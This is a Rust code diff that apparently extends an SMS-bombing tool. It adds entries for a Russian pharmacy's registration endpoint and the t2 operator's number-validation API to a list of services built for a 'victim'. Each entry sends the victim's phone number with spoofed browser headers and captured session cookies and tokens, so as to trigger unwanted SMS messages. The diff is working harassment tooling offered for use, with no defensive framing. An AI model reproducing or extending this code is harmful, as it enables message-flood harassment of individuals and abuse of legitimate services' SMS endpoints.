@@ -193,6 +193,84 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 services.push(service);
             }
 
+            //NFApteka
+            {
+                let mut service = Service {
+                    name: "NFApteka".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://nfapteka.ru/registration/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Accept", r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/x-www-form-urlencoded; charset=UTF-8"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                    
+                service.headers.insert(
+                    "DNT",
+                    r#"1"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Sec-GPC",
+                    r#"1"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("Cookie", r#"rrpvid=386124577368602; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A70%2C%22EXPIRE%22%3A1731704340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_V6NTR3RQJV=GS1.1.1723131934.1.1.1723132031.60.0.0; _ga=GA1.1.1422573028.1723131935; rcuid=66b4e8220312d5b9f82e67ac; _ym_uid=1723131943370705992; _ym_d=1723131943; BITRIX_SMQ_PK=moskva; PHPSESSID=rbvbT2hdzVxPzfcgcGi519r2EuHHpCge; BITRIX_SMQ_SET_CITY=1; BITRIX_SMQ_PK_REGION=moskva"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://nfapteka.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Referer", r#"https://nfapteka.ru/registration/"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Priority", r#"u=0"#.parse().unwrap());
+                service.headers.insert("TE", r#"trailers"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "phoneNumber": phone.phone,
+                });
+
+                services.push(service);
+            }
             // Operators
             // Megafon
             {
@@ -265,6 +343,100 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 service.body = json!({
                     "login": phone.phone,
                     "captchaReady": true
+                });
+
+                services.push(service);
+            //t2
+                let mut service = Service {
+                    name: "t2".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://msk.t2.ru/api/validation/number/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                    };
+
+                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#.parse().unwrap());
+
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Referer", r#"https://msk.t2.ru/"#.parse().unwrap());
+
+                service.headers.insert(
+                    "Content-Type",
+                    r#"application/json"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert(
+                    "Tele2-User-Agent",
+                    r#"web"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-Request-Id", r#"PSNEpLwduF3QoiZITtWaRk1ylK85vh4UYmn27BbH"#.parse().unwrap());
+                
+                service.headers.insert(
+                    "X-Requested-With",
+                    r#"XMLHttpRequest"#
+                        .parse()
+                        .unwrap(),
+                );
+
+                service.headers.insert(
+                    "X-csrftoken",
+                    r#"1807f8982339d332098970a0a9f6c1368b88dc3ec4826267e12ec71cc4d8ae8192748b5812de4e36"#
+                        .parse()
+                        .unwrap(),
+                );
+
+                service.headers.insert(
+                    "X-Ajax-Token",
+                    r#"3f233460cff09905b0c79b19b3742039389db9c4d212080fe325ea418906dd64"#
+                        .parse()
+                        .unwrap(),
+                );
+
+                service
+                    .headers
+                    .insert("Origin", r#"https://msk.t2.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                
+                service
+                    .headers
+                    .insert("Cookie", r#"language=ru-RU; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.t2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; user-separator=part12; ngenix_jscv_ce4643=visitor_id_af50ddc3=c1581181734ff2a451544cfab462773c&bot_profile_check=true&cookie_signature=G8dTNXiPCwLDLJxKwkBAiqCgqUE%3D&session_id_e0227498=29ffbf5d18ca69cd3ed8496d62d9eef2&domain=t2.ru&cookie_expires=1731710650; session-cookie=1807ced90caa9246bc393bb04c95548f7fe83cdf88f99fe6a9e46ea3a91e9bb476f121544404118a1f2fb76d8f8a5777; auth_state=NOT_AUTH; JSESSIONID=IZMs8pYqyhFkTvGEHg6ytK2-ob9QsNbEdwWP9T2TIke9ZBBBeDNU!-1577598710; csrf-token-name=csrftoken; csrf-token-value=1807f89954819f9762bbadac1ea9fc8cb3af213f0b53e1950364c5415cc9cde3d01114adf7f30f29"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                    
+                let mut phone = victim.phone.clone();
+                    phone.format(WithPlus);
+                    service.body = json!({
+                    "phone": phone.phone,
+                    "sender": "Tele2"
                 });
 
                 services.push(service);
